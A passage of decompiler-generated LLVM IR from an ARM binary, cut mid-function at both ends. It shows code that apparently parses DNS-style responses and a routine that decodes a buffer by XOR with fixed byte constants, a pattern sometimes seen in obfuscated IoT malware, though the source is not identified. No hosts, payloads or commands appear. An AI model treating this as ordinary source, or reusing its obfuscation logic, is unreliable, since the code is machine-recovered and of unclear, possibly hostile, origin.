  store i32 2048, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_9728 = load i32, i32* %sb.global-to-local, align 4
  %v0_972c = load i32, i32* @r7, align 4
  %v7_9734 = call i32 @function_c018(i32 %v0_9728, i32* nonnull %stack_var_-4284, i32 2048, i32 16384, i32 %v0_972c, i32 %v0_972c)
  store i32 %v7_9734, i32* @r4, align 4
  %v0_973c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_973c, i32* @r0, align 4
  %v0_9740 = call i32 @function_ab0c()
  %v1_9744 = add i32 %v0_9740, 17
  %v0_9748 = load i32, i32* @r4, align 4
  %v3_9748 = icmp ult i32 %v0_9748, %v1_9744
  %v9_9748 = icmp eq i32 %v0_9748, %v1_9744
  store i1 %v9_9748, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_9748, label %dec_label_pc_98bc, label %dec_label_pc_9750

dec_label_pc_9750:                                ; preds = %dec_label_pc_9704
  store i32 %v2_9750, i32* %r8.global-to-local, align 4
  store i32 %v2_9750, i32* @r0, align 4
  %v0_9758 = call i32 @function_ab0c()
  store i32 -4248, i32* %r3.global-to-local, align 4
  store i32 %v2_969c, i32* %r2.global-to-local, align 4
  %v4_9768 = load i8, i8* %v3_9768, align 4
  %v6_9768 = zext i8 %v4_9768 to i32
  store i32 %v4_976c, i32* %r2.global-to-local, align 4
  %v5_9770 = or i32 %v6_9768, %v4_9770
  store i32 %v5_9770, i32* %r3.global-to-local, align 4
  %v0_9774 = load i32, i32* %r8.global-to-local, align 4
  %v2_9774 = add i32 %v0_9774, %v0_9758
  store i32 %v2_9774, i32* %r1.global-to-local, align 4
  %v1_9778 = load i32, i32* %fp.global-to-local, align 4
  %v9_9778 = icmp eq i32 %v5_9770, %v1_9778
  store i1 %v9_9778, i1* %cpsr_z.global-to-local, align 1
  %v1_977c = add i32 %v2_9774, 1
  %v1_9780 = add i32 %v2_9774, 5
  store i32 %v1_9780, i32* @r6, align 4
  br i1 %v9_9778, label %dec_label_pc_9788, label %dec_label_pc_98bc

dec_label_pc_9788:                                ; preds = %dec_label_pc_9750
  store i32 %v4_9788, i32* %r2.global-to-local, align 4
  store i32 %v5_9790, i32* %r3.global-to-local, align 4
  store i1 %v7_9790, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9790, label %dec_label_pc_98bc, label %dec_label_pc_9798

dec_label_pc_9798:                                ; preds = %dec_label_pc_9788
  %v1_9798 = add i32 %v2_9774, 2
  %v2_9798 = inttoptr i32 %v1_9798 to i8*
  %v3_9798 = load i8, i8* %v2_9798, align 1
  %v4_9798 = zext i8 %v3_9798 to i32
  store i32 %v4_9798, i32* %r3.global-to-local, align 4
  %v2_979c = inttoptr i32 %v1_977c to i8*
  %v3_979c = load i8, i8* %v2_979c, align 1
  %v4_979c = zext i8 %v3_979c to i32
  store i32 %v4_979c, i32* %r2.global-to-local, align 4
  %v4_97a0 = mul nuw nsw i32 %v4_979c, 256
  %v5_97a0 = or i32 %v4_97a0, %v4_9798
  store i32 %v5_97a0, i32* %r3.global-to-local, align 4
  %v7_97a4 = icmp eq i32 %v5_97a0, 16
  store i1 %v7_97a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_97a4, label %dec_label_pc_97ac, label %dec_label_pc_98bc

dec_label_pc_97ac:                                ; preds = %dec_label_pc_9798
  store i32 %v1_9780, i32* @r0, align 4
  %v0_97b0 = call i32 @function_ab0c()
  %v0_97b4 = load i32, i32* @r7, align 4
  store i32 %v0_97b4, i32* %r1.global-to-local, align 4
  %v0_97b8 = load i32, i32* @r6, align 4
  store i32 %v0_97b8, i32* %ip.global-to-local, align 4
  %v9_97e016 = icmp eq i32 %v0_97b4, %v0_97b0
  store i1 %v9_97e016, i1* %cpsr_z.global-to-local, align 1
  %v5_97e417 = icmp slt i32 %v0_97b4, %v0_97b0
  br i1 %v5_97e417, label %dec_label_pc_97c0, label %dec_label_pc_97e8

dec_label_pc_97c0:                                ; preds = %dec_label_pc_97ac, %dec_label_pc_97e0.dec_label_pc_97c0_crit_edge
  %v4_97d4 = phi i32 [ %v1_97dc, %dec_label_pc_97e0.dec_label_pc_97c0_crit_edge ], [ %v0_97b4, %dec_label_pc_97ac ]
  %v3_97d4 = phi i32 [ %v0_97c0.pre, %dec_label_pc_97e0.dec_label_pc_97c0_crit_edge ], [ %v0_97b8, %dec_label_pc_97ac ]
  %v2_97c0 = add i32 %v3_97d4, %v4_97d4
  %v3_97c0 = inttoptr i32 %v2_97c0 to i8*
  %v4_97c0 = load i8, i8* %v3_97c0, align 1
  %v6_97c0 = zext i8 %v4_97c0 to i32
  %v7_97c4 = icmp eq i8 %v4_97c0, -64
  store i1 %v7_97c4, i1* %cpsr_z.global-to-local, align 1
  %v1_97c8 = add nuw nsw i32 %v6_97c0, 1
  store i32 %v1_97c8, i32* %r3.global-to-local, align 4
  br i1 %v7_97c4, label %.thread, label %.thread4

.thread:                                          ; preds = %dec_label_pc_97c0
  %v2_97cc = add i32 %v3_97d4, 1
  %v3_97cc = inttoptr i32 %v2_97cc to i8*
  %v4_97cc = load i8, i8* %v3_97cc, align 1
  %v5_97cc = zext i8 %v4_97cc to i32
  %v1_97d0 = load i32, i32* @r5, align 4
  %v3_97d0 = add i32 %v5_97cc, %v1_97d0
  store i32 %v3_97d0, i32* %r3.global-to-local, align 4
  br label %.thread5

.thread4:                                         ; preds = %dec_label_pc_97c0
  %v2_97d4 = trunc i32 %v1_97c8 to i8
  store i8 %v2_97d4, i8* %v3_97c0, align 1
  %v0_97d8.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_97d8.pr, label %.thread4..thread5_crit_edge, label %dec_label_pc_97e0

.thread4..thread5_crit_edge:                      ; preds = %.thread4
  %v1_97d8.pre = load i32, i32* %r3.global-to-local, align 4
  br label %.thread5

.thread5:                                         ; preds = %.thread, %.thread4..thread5_crit_edge
  %v1_97d8 = phi i32 [ %v1_97d8.pre, %.thread4..thread5_crit_edge ], [ %v3_97d0, %.thread ]
  %v2_97d8 = add i32 %v1_97d8, -1
  store i32 %v2_97d8, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_97e0

dec_label_pc_97e0:                                ; preds = %.thread4, %.thread5
  %v0_97dc = load i32, i32* %r1.global-to-local, align 4
  %v1_97dc = add i32 %v0_97dc, 1
  store i32 %v1_97dc, i32* %r1.global-to-local, align 4
  %v9_97e0 = icmp eq i32 %v1_97dc, %v0_97b0
  store i1 %v9_97e0, i1* %cpsr_z.global-to-local, align 1
  %v5_97e4 = icmp slt i32 %v1_97dc, %v0_97b0
  br i1 %v5_97e4, label %dec_label_pc_97e0.dec_label_pc_97c0_crit_edge, label %dec_label_pc_97e0.dec_label_pc_97e8_crit_edge

dec_label_pc_97e0.dec_label_pc_97c0_crit_edge:    ; preds = %dec_label_pc_97e0
  %v0_97c0.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_97c0

dec_label_pc_97e0.dec_label_pc_97e8_crit_edge:    ; preds = %dec_label_pc_97e0
  %v0_97e8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_97e8

dec_label_pc_97e8:                                ; preds = %dec_label_pc_97e0.dec_label_pc_97e8_crit_edge, %dec_label_pc_97ac
  %v0_980c = phi i32 [ %v0_97e8.pre, %dec_label_pc_97e0.dec_label_pc_97e8_crit_edge ], [ %v0_97b8, %dec_label_pc_97ac ]
  %v1_97e8 = add i32 %v0_980c, 2
  store i32 %v1_97e8, i32* @r4, align 4
  %v1_97ec = add i32 %v0_980c, 11
  %v2_97ec = inttoptr i32 %v1_97ec to i8*
  %v3_97ec = load i8, i8* %v2_97ec, align 1
  %v4_97ec = zext i8 %v3_97ec to i32
  store i32 %v4_97ec, i32* %r2.global-to-local, align 4
  %v1_97f0 = add i32 %v0_980c, 10
  %v2_97f0 = inttoptr i32 %v1_97f0 to i8*
  %v3_97f0 = load i8, i8* %v2_97f0, align 1
  %v4_97f0 = zext i8 %v3_97f0 to i32
  %v4_97f4 = mul nuw nsw i32 %v4_97ec, 256
  %v5_97f4 = or i32 %v4_97f0, %v4_97f4
  %v3_97f8 = mul i32 %v5_97f4, 65536
  store i32 %v3_97f8, i32* %r3.global-to-local, align 4
  %v3_97fc = mul nuw nsw i32 %v4_97f0, 256
  %v1_9800 = add i32 %v0_980c, 12
  store i32 %v1_9800, i32* @r5, align 4
  %v5_9808 = or i32 %v3_97fc, %v4_97ec
  store i32 %v5_9808, i32* @r2, align 4
  %v1_980c = add i32 %v0_980c, 13
  store i32 %v1_980c, i32* @r1, align 4
  store i32 %v1_9800, i32* @r0, align 4
  %v3_9814 = call i32 @function_be30(i32 %v1_9800, i32 %v1_980c, i32 %v5_9808)
  %v0_9818 = load i32, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 2048, i32* @r2, align 4
  %v3_9824 = call i32 @function_aba4(i32 %v0_9818, i32 0, i32 2048)
  %v0_9828 = load i32, i32* @r4, align 4
  %v1_9828 = add i32 %v0_9828, 9
  %v2_9828 = inttoptr i32 %v1_9828 to i8*
  %v3_9828 = load i8, i8* %v2_9828, align 1
  %v4_9828 = zext i8 %v3_9828 to i32
  store i32 %v4_9828, i32* %r2.global-to-local, align 4
  %v1_982c = add i32 %v0_9828, 8
  %v2_982c = inttoptr i32 %v1_982c to i8*
  %v3_982c = load i8, i8* %v2_982c, align 1
  %v4_982c = zext i8 %v3_982c to i32
  %v4_9830 = mul nuw nsw i32 %v4_9828, 256
  %v5_9830 = or i32 %v4_982c, %v4_9830
  %v3_9834 = mul i32 %v5_9830, 65536
  store i32 %v3_9834, i32* %r3.global-to-local, align 4
  %v3_9838 = mul nuw nsw i32 %v4_982c, 256
  %v5_9840 = or i32 %v3_9838, %v4_9828
  %v1_9844 = add nsw i32 %v5_9840, -1
  store i32 %v1_9844, i32* @r2, align 4
  %v0_9848 = load i32, i32* %sl.global-to-local, align 4
  %v0_984c = load i32, i32* @r5, align 4
  store i32 %v0_984c, i32* %r1.global-to-local, align 4
  %v3_9850 = call i32 @function_ab58(i32 %v0_9848, i32 %v0_984c, i32 %v1_9844)
  %v4_9854 = sext i8 %stack_var_-4288.0 to i32
  store i32 %v4_9854, i32* %r3.global-to-local, align 4
  %v3_9858 = add i32 %v0_9848, 2052
  %v4_9858 = inttoptr i32 %v3_9858 to i8*
  store i8 %stack_var_-4288.0, i8* %v4_9858, align 1
  %v0_985c = load i32, i32* @r4, align 4
  %v1_985c = add i32 %v0_985c, 1
  %v2_985c = inttoptr i32 %v1_985c to i8*
  %v3_985c = load i8, i8* %v2_985c, align 1
  %v4_985c = zext i8 %v3_985c to i32
  store i32 %v4_985c, i32* %r3.global-to-local, align 4
  %v0_9860 = load i32, i32* @r6, align 4
  %v1_9860 = add i32 %v0_9860, 2
  %v2_9860 = inttoptr i32 %v1_9860 to i8*
  %v3_9860 = load i8, i8* %v2_9860, align 1
  %v4_9860 = zext i8 %v3_9860 to i32
  %tmp88 = mul nuw nsw i32 %v4_9860, 256
  %v5_9874 = or i32 %tmp88, %v4_985c
  store i32 %v5_9874, i32* %r3.global-to-local, align 4
  store i32 %v4_9860, i32* %r2.global-to-local, align 4
  %v2_987c = load i32, i32* %sl.global-to-local, align 4
  %v3_987c = add i32 %v2_987c, 2049
  %v4_987c = inttoptr i32 %v3_987c to i8*
  store i8 %v3_9860, i8* %v4_987c, align 1
  %v0_9880 = load i32, i32* %r3.global-to-local, align 4
  %v1_9880 = trunc i32 %v0_9880 to i8
  %v2_9880 = load i32, i32* %sl.global-to-local, align 4
  %v3_9880 = add i32 %v2_9880, 2048
  %v4_9880 = inttoptr i32 %v3_9880 to i8*
  store i8 %v1_9880, i8* %v4_9880, align 1
  %v0_9884 = load i32, i32* @r4, align 4
  %v1_9884 = add i32 %v0_9884, 3
  %v2_9884 = inttoptr i32 %v1_9884 to i8*
  %v3_9884 = load i8, i8* %v2_9884, align 1
  %v4_9884 = zext i8 %v3_9884 to i32
  store i32 %v4_9884, i32* %r2.global-to-local, align 4
  %v1_9888 = add i32 %v0_9884, 2
  %v2_9888 = inttoptr i32 %v1_9888 to i8*
  %v3_9888 = load i8, i8* %v2_9888, align 1
  %v4_9888 = zext i8 %v3_9888 to i32
  %v3_9894 = mul nuw nsw i32 %v4_9888, 256
  %v5_989c = or i32 %v3_9894, %v4_9884
  store i32 %v5_989c, i32* %r2.global-to-local, align 4
  store i32 %v4_9888, i32* %r3.global-to-local, align 4
  %v2_98a4 = load i32, i32* %sl.global-to-local, align 4
  %v3_98a4 = add i32 %v2_98a4, 2051
  %v4_98a4 = inttoptr i32 %v3_98a4 to i8*
  store i8 %v3_9888, i8* %v4_98a4, align 1
  %v0_98a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_98a8 = trunc i32 %v0_98a8 to i8
  %v2_98a8 = load i32, i32* %sl.global-to-local, align 4
  %v3_98a8 = add i32 %v2_98a8, 2050
  %v4_98a8 = inttoptr i32 %v3_98a8 to i8*
  store i8 %v1_98a8, i8* %v4_98a8, align 1
  %v0_98ac = load i32, i32* @r5, align 4
  store i32 %v0_98ac, i32* @r0, align 4
  %v0_98b0 = call i32 @function_ab0c()
  %v1_98b0 = trunc i32 %v0_98b0 to i8
  %v3_98b4 = load i32, i32* %sl.global-to-local, align 4
  %v4_98b4 = add i32 %v3_98b4, 2053
  %v5_98b4 = inttoptr i32 %v4_98b4 to i8*
  store i8 %v1_98b0, i8* %v5_98b4, align 1
  br label %dec_label_pc_98dc

dec_label_pc_98bc:                                ; preds = %dec_label_pc_9704, %dec_label_pc_9798, %dec_label_pc_9750, %dec_label_pc_9788, %dec_label_pc_96f4, %dec_label_pc_96ec, %dec_label_pc_961c
  %v4_98bc = sext i8 %stack_var_-4288.0 to i32
  store i32 %v4_98bc, i32* %ip.global-to-local, align 4
  %v1_98c0 = add nsw i32 %v4_98bc, 1
  %v3_98c8 = urem i32 %v1_98c0, 65536
  store i32 %v3_98c8, i32* %r3.global-to-local, align 4
  %v7_98cc = icmp eq i32 %v3_98c8, 11
  store i1 %v7_98cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_98cc, label %dec_label_pc_98f0, label %dec_label_pc_98bc.dec_label_pc_95d8_crit_edge

dec_label_pc_98bc.dec_label_pc_95d8_crit_edge:    ; preds = %dec_label_pc_98bc
  %v5_98d0 = trunc i32 %v1_98c0 to i8
  %v0_95d8.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_95d8

dec_label_pc_98dc:                                ; preds = %dec_label_pc_9694, %dec_label_pc_97e8
  %v1_98e0 = call i32 @function_82cc(i32 25)
  %v0_98e4 = load i32, i32* %sb.global-to-local, align 4
  %v1_98e8 = call i32 @function_b880(i32 %v0_98e4)
  %v0_9904.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_9904

dec_label_pc_98f0:                                ; preds = %dec_label_pc_98bc
  %v1_98f4 = call i32 @function_82cc(i32 25)
  %v0_98f8 = load i32, i32* %sb.global-to-local, align 4
  %v1_98fc = call i32 @function_b880(i32 %v0_98f8)
  store i32 0, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_9904

dec_label_pc_9904:                                ; preds = %dec_label_pc_98dc, %dec_label_pc_98f0
  %v0_9904 = phi i32 [ %v0_9904.pre, %dec_label_pc_98dc ], [ 0, %dec_label_pc_98f0 ]
  %v2_9910 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_9910, i32* @r4, align 4
  store i32 %v6_94a0, i32* @r5, align 4
  store i32 %v9_94a0, i32* @r6, align 4
  store i32 %v12_94a0, i32* @r7, align 4
  ret i32 %v0_9904

; uselistorder directives
  uselistorder i32 %v3_98c8, { 1, 0 }
  uselistorder i32 %v1_98c0, { 1, 0 }
  uselistorder i32 %v4_9888, { 1, 0 }
  uselistorder i32 %v4_9860, { 1, 0 }
  uselistorder i32 %v4_9828, { 1, 0, 2 }
  uselistorder i32 %v1_9800, { 1, 0, 2 }
  uselistorder i32 %v4_97ec, { 1, 0, 2 }
  uselistorder i32 %v0_980c, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v1_97dc, { 2, 1, 3, 0 }
  uselistorder i32 %v3_97d4, { 1, 0 }
  uselistorder i32 %v0_97b8, { 1, 0, 2 }
  uselistorder i32 %v0_97b4, { 0, 2, 1, 3 }
  uselistorder i32 %v0_97b0, { 2, 3, 0, 1 }
  uselistorder i32 %v2_9774, { 0, 2, 1, 3 }
  uselistorder i32 %v0_9748, { 1, 0 }
  uselistorder i32 %v1_96ec, { 1, 0, 2 }
  uselistorder i1 %v7_96e4, { 1, 0 }
  uselistorder i32 %v5_96e0, { 1, 0 }
  uselistorder i32 %v1_96ac, { 1, 0 }
  uselistorder i32 %v3_9698, { 1, 0 }
  uselistorder i32 %v0_9698, { 1, 0 }
  uselistorder i32 %v1_9688, { 1, 2, 0 }
  uselistorder i1 %v7_95f4, { 1, 0 }
  uselistorder i32 %v3_95f0, { 1, 2, 0 }
  uselistorder i1 %v7_95d8, { 2, 1, 0 }
  uselistorder i8 %stack_var_-4288.0, { 2, 1, 0 }
  uselistorder i32 %v5_9790, { 1, 0 }
  uselistorder i32 %v4_9788, { 1, 0 }
  uselistorder i32 %v4_976c, { 1, 0 }
  uselistorder i32 %v2_969c, { 1, 0, 3, 2 }
  uselistorder i32 %v2_967c, { 1, 0, 2 }
  uselistorder i32 %v1_9554, { 1, 0, 3, 2 }
  uselistorder i32 %v2_9540, { 1, 0 }
  uselistorder i32 %v1_9524, { 2, 1, 3, 0 }
  uselistorder i32 %v1_9528, { 0, 3, 2, 1 }
  uselistorder i32 %v0_9514, { 1, 0 }
  uselistorder i32 %v1_9510, { 0, 2, 1 }
  uselistorder i32 %v0_9508, { 1, 0, 2 }
  uselistorder i32 %v1_94ec, { 1, 2, 0 }
  uselistorder i32 %v1_94f4, { 2, 0, 1 }
  uselistorder i32 %v2_94f8, { 2, 0, 1 }
  uselistorder i32 %v1_952819, { 1, 0, 2, 3 }
  uselistorder i32 %v2_94c8, { 2, 3, 1, 0, 4 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i32* %stack_var_-60, { 0, 2, 1 }
  uselistorder i32* %sl.global-to-local, { 9, 0, 2, 3, 4, 5, 6, 7, 1, 8 }
  uselistorder i32* %sb.global-to-local, { 6, 7, 5, 0, 1, 2, 3, 4, 8, 9 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 27, 28, 29, 30, 31, 32, 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26 }
  uselistorder i32* %r2.global-to-local, { 17, 18, 19, 20, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32* %r1.global-to-local, { 22, 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* %ip.global-to-local, { 8, 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i1* %cpsr_z.global-to-local, { 20, 5, 3, 4, 2, 6, 7, 8, 9, 10, 11, 12, 1, 13, 14, 15, 16, 19, 17, 18, 0 }
  uselistorder i32 -4248, { 1, 0 }
  uselistorder label %dec_label_pc_9904, { 1, 0 }
  uselistorder label %dec_label_pc_98dc, { 1, 0 }
  uselistorder label %dec_label_pc_98bc, { 1, 3, 2, 0, 4, 5, 6 }
  uselistorder label %dec_label_pc_97e0, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %dec_label_pc_97c0, { 1, 0 }
  uselistorder label %dec_label_pc_961c, { 2, 0, 1 }
  uselistorder label %bb87, { 1, 0 }
  uselistorder label %dec_label_pc_9524, { 1, 0 }
  uselistorder label %dec_label_pc_9508, { 1, 0 }
  uselistorder label %dec_label_pc_94e0, { 1, 0 }
}

define i32 @function_9920(i32 %arg1) local_unnamed_addr {
dec_label_pc_9920:
  %v2_9924 = load i32, i32* @global_var_1743c.130, align 4
  %v2_992c = call i32 @function_b984(i32 %v2_9924, i32 9)
  %v0_9930 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_9930, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_9920
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_9920, %bb
  ret i32 %v2_992c

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_9934(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_9934:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_9938 = load i32, i32* @r4, align 4
  store i32 %v3_9938, i32* %stack_var_-20, align 4
  %v6_9938 = load i32, i32* @r5, align 4
  %v9_9938 = load i32, i32* @r6, align 4
  %v12_9938 = load i32, i32* @r7, align 4
  %v3_993c = urem i32 %arg1, 65536
  store i32 %v3_993c, i32* @r7, align 4
  store i32 12, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  %v1_9948 = urem i32 %arg2, 256
  store i32 %v1_9948, i32* @r4, align 4
  %v1_994c = call i32 @function_c1f8(i32 12)
  %v0_9950 = load i32, i32* @r7, align 4
  %v3_9950 = sdiv i32 %v0_9950, 256
  store i32 %v1_994c, i32* @r6, align 4
  store i32 %v0_9950, i32* %r0.global-to-local, align 4
  %v1_995c = trunc i32 %v3_9950 to i8
  %v3_995c = add i32 %v1_994c, 1
  %v4_995c = inttoptr i32 %v3_995c to i8*
  store i8 %v1_995c, i8* %v4_995c, align 1
  %v0_9960 = load i32, i32* @r4, align 4
  %v1_9960 = trunc i32 %v0_9960 to i8
  %v2_9960 = load i32, i32* @r6, align 4
  %v3_9960 = add i32 %v2_9960, 2
  %v4_9960 = inttoptr i32 %v3_9960 to i8*
  store i8 %v1_9960, i8* %v4_9960, align 1
  %v0_9964 = load i32, i32* @r7, align 4
  %v1_9964 = trunc i32 %v0_9964 to i8
  %v2_9964 = load i32, i32* @r6, align 4
  %v3_9964 = inttoptr i32 %v2_9964 to i8*
  store i8 %v1_9964, i8* %v3_9964, align 1
  %v1_9968 = call i32 @function_c1f8(i32 %v0_9950)
  store i32 %v1_9968, i32* %r0.global-to-local, align 4
  %v0_996c = load i32, i32* @r5, align 4
  store i32 %v0_996c, i32* %r1.global-to-local, align 4
  %v0_9970 = load i32, i32* @r7, align 4
  store i32 %v0_9970, i32* @r2, align 4
  %v1_9974 = load i32, i32* @r6, align 4
  %v2_9974 = add i32 %v1_9974, 4
  %v3_9974 = inttoptr i32 %v2_9974 to i32*
  store i32 %v1_9968, i32* %v3_9974, align 4
  %v3_9978 = call i32 @function_ab58(i32 %v1_9968, i32 %v0_996c, i32 %v0_9970)
  br label %dec_label_pc_99d0

dec_label_pc_9984:                                ; preds = %dec_label_pc_99d0
  %v0_9984 = load i32, i32* @r6, align 4
  %v1_9984 = add i32 %v0_9984, 4
  %v2_9984 = inttoptr i32 %v1_9984 to i32*
  %v3_9984 = load i32, i32* %v2_9984, align 4
  store i32 %v3_9984, i32* %r1.global-to-local, align 4
  %v2_9988 = add i32 %v3_9984, %v2_9994
  %v3_9988 = inttoptr i32 %v2_9988 to i8*
  %v4_9988 = load i8, i8* %v3_9988, align 1
  store i32 -19, i32* %r2.global-to-local, align 4
  %v2_9990 = xor i8 %v4_9988, -19
  store i8 %v2_9990, i8* %v3_9988, align 1
  %v0_9998 = load i32, i32* @r6, align 4
  %v1_9998 = add i32 %v0_9998, 4
  %v2_9998 = inttoptr i32 %v1_9998 to i32*
  %v3_9998 = load i32, i32* %v2_9998, align 4
  store i32 %v3_9998, i32* %r1.global-to-local, align 4
  %v0_999c = load i32, i32* %r0.global-to-local, align 4
  %v2_999c = add i32 %v0_999c, %v3_9998
  %v3_999c = inttoptr i32 %v2_999c to i8*
  %v4_999c = load i8, i8* %v3_999c, align 1
  store i32 -22, i32* %r2.global-to-local, align 4
  %v2_99a4 = xor i8 %v4_999c, -22
  store i8 %v2_99a4, i8* %v3_999c, align 1
  %v0_99ac = load i32, i32* @r6, align 4
  %v1_99ac = add i32 %v0_99ac, 4
  %v2_99ac = inttoptr i32 %v1_99ac to i32*
  %v3_99ac = load i32, i32* %v2_99ac, align 4
  store i32 %v3_99ac, i32* %r2.global-to-local, align 4
  %v0_99b0 = load i32, i32* %r0.global-to-local, align 4
  %v2_99b0 = add i32 %v0_99b0, %v3_99ac
  %v3_99b0 = inttoptr i32 %v2_99b0 to i8*
  %v4_99b0 = load i8, i8* %v3_99b0, align 1
  %v6_99b0 = zext i8 %v4_99b0 to i32
  %v1_99b4 = load i32, i32* %ip.global-to-local, align 4
  %v2_99b4 = xor i32 %v1_99b4, %v6_99b0
  %v1_99b8 = trunc i32 %v2_99b4 to i8
  store i8 %v1_99b8, i8* %v3_99b0, align 1
  %v0_99bc = load i32, i32* @r6, align 4
  %v1_99bc = add i32 %v0_99bc, 4
  %v2_99bc = inttoptr i32 %v1_99bc to i32*
  %v3_99bc = load i32, i32* %v2_99bc, align 4
  store i32 %v3_99bc, i32* %r2.global-to-local, align 4
  %v0_99c0 = load i32, i32* %r0.global-to-local, align 4
  %v2_99c0 = add i32 %v0_99c0, %v3_99bc
  %v3_99c0 = inttoptr i32 %v2_99c0 to i8*
  %v4_99c0 = load i8, i8* %v3_99c0, align 1
  %v6_99c0 = zext i8 %v4_99c0 to i32
  %v1_99c4 = load i32, i32* %ip.global-to-local, align 4
  %v2_99c4 = xor i32 %v1_99c4, %v6_99c0
  %v1_99c8 = trunc i32 %v2_99c4 to i8
  store i8 %v1_99c8, i8* %v3_99c0, align 1
  %v0_99cc = load i32, i32* %r0.global-to-local, align 4
  %v1_99cc = add i32 %v0_99cc, 1
  br label %dec_label_pc_99d0

dec_label_pc_99d0:                                ; preds = %dec_label_pc_9934, %dec_label_pc_9984
  %v2_9994 = phi i32 [ 0, %dec_label_pc_9934 ], [ %v1_99cc, %dec_label_pc_9984 ]
  store i32 %v2_9994, i32* %r0.global-to-local, align 4
  %v1_99d0 = load i32, i32* @r7, align 4
  store i32 -34, i32* %ip.global-to-local, align 4
  %v5_99d8 = icmp slt i32 %v2_9994, %v1_99d0
  br i1 %v5_99d8, label %dec_label_pc_9984, label %dec_label_pc_99dc

dec_label_pc_99dc:                                ; preds = %dec_label_pc_99d0
  store i32 ptrtoint (i8** @global_var_17440.132 to i32), i32* %r1.global-to-local, align 4
  %v3_99e0 = load i8, i8* @global_var_17441.133, align 1
  %v4_99e0 = zext i8 %v3_99e0 to i32
  %v2_99e4 = load i8, i8* bitcast (i8** @global_var_17440.132 to i8*), align 4
  %v3_99e4 = zext i8 %v2_99e4 to i32
  store i32 ptrtoint (i32* @global_var_17448.135 to i32), i32* %r0.global-to-local, align 4
  %v4_99ec = mul nuw nsw i32 %v4_99e0, 256
  %v5_99ec = or i32 %v3_99e4, %v4_99ec
  %v1_99f0 = add nuw nsw i32 %v5_99ec, 1
  store i32 %v1_99f0, i32* %r2.global-to-local, align 4
  %v2_99f4 = load i32, i32* @global_var_17448.135, align 4
  store i32 %v2_99f4, i32* %ip.global-to-local, align 4
  %v3_99f81 = udiv i32 %v1_99f0, 256
  %v1_99fc = trunc i32 %v3_99f81 to i8
  store i8 %v1_99fc, i8* @global_var_17441.133, align 1
  %v1_9a04 = load i32, i32* @r6, align 4
  %v2_9a04 = add i32 %v1_9a04, 8
  %v3_9a04 = inttoptr i32 %v2_9a04 to i32*
  store i32 0, i32* %v3_9a04, align 4
  %v0_9a08 = load i32, i32* @r6, align 4
  store i32 %v0_9a08, i32* @global_var_17448.135, align 4
  %v1_9a0c = load i32, i32* %ip.global-to-local, align 4
  %v2_9a0c = add i32 %v1_9a0c, 8
  %v3_9a0c = inttoptr i32 %v2_9a0c to i32*
  store i32 %v0_9a08, i32* %v3_9a0c, align 4
  %v0_9a10 = load i32, i32* %r2.global-to-local, align 4
  %v1_9a10 = trunc i32 %v0_9a10 to i8
  %v2_9a10 = load i32, i32* %r1.global-to-local, align 4
  %v3_9a10 = inttoptr i32 %v2_9a10 to i8*
  store i8 %v1_9a10, i8* %v3_9a10, align 1
  %v2_9a14 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_9a14, i32* @r4, align 4
  store i32 %v6_9938, i32* @r5, align 4
  store i32 %v9_9938, i32* @r6, align 4
  store i32 %v12_9938, i32* @r7, align 4
  ret i32 ptrtoint (i32* @global_var_17448.135 to i32)

; uselistorder directives
  uselistorder i32 %v2_9994, { 1, 2, 0 }
  uselistorder i32 %v0_9950, { 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 1, 2, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 6, 2, 3, 4, 5, 8, 7, 9, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 4, 2, 3 }
  uselistorder label %dec_label_pc_99d0, { 1, 0 }
}

define i32 @function_9a20(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_9a20:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
